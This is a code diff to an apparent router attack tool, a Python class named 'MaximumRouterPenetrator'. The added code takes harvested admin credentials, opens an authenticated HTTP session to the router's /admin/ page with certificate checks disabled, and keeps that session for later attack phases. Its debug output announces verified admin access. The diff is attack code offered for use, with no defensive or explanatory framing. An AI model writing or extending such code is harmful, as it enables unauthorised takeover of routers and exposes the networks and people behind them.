@@ -2376,6 +2376,21 @@ class MaximumRouterPenetrator:
                         'verification_score': verification['score'],
                         'admin_pages_confirmed': verification['pages_accessed']
                     }
+                    # Ensure we have a usable session for downstream phases
+                    if not auth_result.get('session') and REQUESTS_AVAILABLE:
+                        try:
+                            session = requests.Session()
+                            session.auth = (username, password)
+                            session.verify = False
+                            # Warm-up request to establish cookies/session
+                            warmup = session.get(f"http://{ip}/admin/", timeout=self.performance_config['timeouts']['connection'])
+                            if warmup.status_code in (200, 302, 301, 403):
+                                auth_result['session'] = session
+                                if verbose:
+                                    print(f"            ✅ LIVE DEBUG: Created fallback authenticated session for downstream use")
+                        except Exception as e:
+                            if verbose:
+                                print(f"            ❌ LIVE DEBUG: Fallback session creation failed: {str(e)[:60]}")
                     
                     if verbose:
                         print(f"            ✅ LIVE DEBUG: ADMIN ACCESS VERIFIED!")
